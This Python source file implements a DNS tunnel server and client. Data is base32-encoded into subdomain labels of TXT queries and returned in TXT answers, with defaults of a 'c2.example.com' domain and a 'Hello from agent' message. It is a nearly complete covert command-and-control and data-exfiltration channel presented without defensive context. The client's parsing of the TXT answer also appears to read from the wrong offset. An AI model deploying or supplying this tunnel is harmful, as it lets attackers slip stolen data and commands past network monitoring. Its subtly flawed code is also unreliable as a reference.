import argparse
import base64
import socket
import struct


DNS_HEADER_SIZE = 12


def build_dns_query_header(transaction_id=0, flags=0x0100):
    return struct.pack(
        "!HHHHHH",
        transaction_id,
        flags,
        1,
        0,
        0,
        0,
    )


def build_dns_response_header(transaction_id=0, flags=0x8180, qdcount=1, ancount=1):
    return struct.pack(
        "!HHHHHH",
        transaction_id,
        flags,
        qdcount,
        ancount,
        0,
        0,
    )


def encode_domain_name(labels):
    result = b""
    for label in labels:
        encoded = label.encode("ascii")
        result += struct.pack("B", len(encoded)) + encoded
    result += b"\x00"
    return result


def decode_domain_name(data, offset=12):
    labels = []
    original_offset = offset
    jumped = False
    max_offset = len(data)
    while offset < max_offset:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            if not jumped:
                original_offset = offset + 2
            pointer = struct.unpack("!H", data[offset:offset + 2])[0] & 0x3FFF
            offset = pointer
            jumped = True
            continue
        offset += 1
        labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
        offset += length
    if jumped:
        return labels, original_offset
    return labels, offset


def build_txt_record(name_labels, txt_data, ttl=60):
    name = encode_domain_name(name_labels)
    type_r = struct.pack("!H", 16)
    class_r = struct.pack("!H", 1)
    ttl_r = struct.pack("!I", ttl)
    rdlength = len(txt_data) + 1
    rdlength_r = struct.pack("!H", rdlength)
    rdata = struct.pack("B", len(txt_data)) + txt_data.encode("ascii")
    return name + type_r + class_r + ttl_r + rdlength_r + rdata


class DNSTunnelServer:
    def __init__(self, domain, listen_port=53):
        self.domain = domain
        self.listen_port = listen_port
        self.data_store = {}
        self.socket = None

    def _extract_subdomain_data(self, query_name):
        labels = query_name.rstrip(".").split(".")
        domain_parts = self.domain.rstrip(".").split(".")
        data_labels = labels[: -len(domain_parts)]
        decoded = ""
        for label in data_labels:
            try:
                decoded += base64.b32decode(label + "=" * (-len(label) % 8)).decode("utf-8")
            except Exception:
                continue
        return decoded

    def encode_response(self, data):
        encoded = base64.b32encode(data.encode("utf-8")).decode("utf-8").rstrip("=").lower()
        return encoded

    def handle_query(self, raw_data):
        try:
            tid = struct.unpack("!H", raw_data[0:2])[0]
            labels, offset = decode_domain_name(raw_data, 12)
            query_name = ".".join(labels)

            decoded = self._extract_subdomain_data(query_name)
            response_data = self.encode_response("ACK:" + decoded)

            name_labels = labels
            answer = build_txt_record(name_labels, response_data)

            header = build_dns_response_header(
                transaction_id=tid,
                qdcount=1,
                ancount=1,
            )
            question_section = encode_domain_name(labels)
            question_section += struct.pack("!HH", 16, 1)

            return header + question_section + answer
        except Exception:
            tid = struct.unpack("!H", raw_data[0:2])[0]
            header = build_dns_response_header(
                transaction_id=tid,
                flags=0x8183,
                qdcount=0,
                ancount=0,
            )
            return header

    def _handle_client(self, data, addr):
        response = self.handle_query(data)
        self.socket.sendto(response, addr)

    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("0.0.0.0", self.listen_port))
        print("[DNS Server] Listening on port {}".format(self.listen_port))
        print("[DNS Server] Tunnel domain: {}".format(self.domain))
        while True:
            data, addr = self.socket.recvfrom(4096)
            self._handle_client(data, addr)


class DNSTunnelClient:
    def __init__(self, domain, dns_server, dns_port=53):
        self.domain = domain
        self.dns_server = dns_server
        self.dns_port = dns_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.settimeout(5)
        self._txid_counter = 0

    def _next_txid(self):
        self._txid_counter += 1
        return self._txid_counter % 65536

    def send_data(self, data):
        encoded = base64.b32encode(data.encode("utf-8")).decode("utf-8").rstrip("=").lower()
        chunk_size = 63
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        responses = []
        for i, chunk in enumerate(chunks):
            session_tag = "s{:02d}".format(i % 100)
            label = chunk
            if len(label) > 63:
                label = label[:63]

            subdomain = "{}.{}.{}".format(session_tag, label, self.domain)
            query_name = subdomain.rstrip(".")
            labels = query_name.split(".")

            tid = self._next_txid()
            header = build_dns_query_header(transaction_id=tid)
            question = encode_domain_name(labels)
            question += struct.pack("!HH", 16, 1)
            packet = header + question

            try:
                self.socket.sendto(packet, (self.dns_server, self.dns_port))
                response_data, _ = self.socket.recvfrom(4096)
                if len(response_data) > DNS_HEADER_SIZE + 4:
                    resp_labels, offset = decode_domain_name(response_data, 12)
                    if offset + 10 <= len(response_data):
                        txt_len = response_data[offset + 1]
                        if offset + 2 + txt_len <= len(response_data):
                            txt_content = response_data[offset + 2:offset + 2 + txt_len]
                            try:
                                decoded = base64.b32decode(
                                    txt_content.decode("ascii") + "=" * (-len(txt_content) % 8)
                                ).decode("utf-8")
                                responses.append(decoded)
                            except Exception:
                                pass
            except socket.timeout:
                pass

        return responses

    def receive_data(self):
        return self.send_data("poll")

    def close(self):
        self.socket.close()


def main():
    parser = argparse.ArgumentParser(description="DNS Tunnel Server/Client")
    parser.add_argument("--mode", choices=["server", "client"], required=True)
    parser.add_argument("--domain", default="c2.example.com", help="Tunnel domain")
    parser.add_argument("--port", type=int, default=10053, help="UDP port")
    parser.add_argument("--dns-server", default="127.0.0.1", help="DNS server address")
    parser.add_argument("--message", default="Hello from agent", help="Message to send (client mode)")
    args = parser.parse_args()

    if args.mode == "server":
        server = DNSTunnelServer(domain=args.domain, listen_port=args.port)
        server.start()
    elif args.mode == "client":
        client = DNSTunnelClient(
            domain=args.domain,
            dns_server=args.dns_server,
            dns_port=args.port,
        )
        print("[DNS Client] Sending: {}".format(args.message))
        responses = client.send_data(args.message)
        print("[DNS Client] Responses: {}".format(responses))
        client.close()


if __name__ == "__main__":
    main()
